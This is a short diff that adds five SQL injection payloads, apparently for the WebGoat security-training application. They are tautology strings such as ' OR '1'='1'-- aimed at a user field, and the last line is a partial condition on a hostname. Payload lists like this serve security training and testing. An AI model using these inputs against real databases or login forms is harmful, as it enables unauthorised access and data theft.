@@ -1,0 +1,5 @@
+Tom' OR '1'='1'-- 
+tom' OR '1'='1'-- 
+' OR '1'='1'-- 
+Tom' OR 'a'='a'-- 
+' OR hostname='webgoat-prd
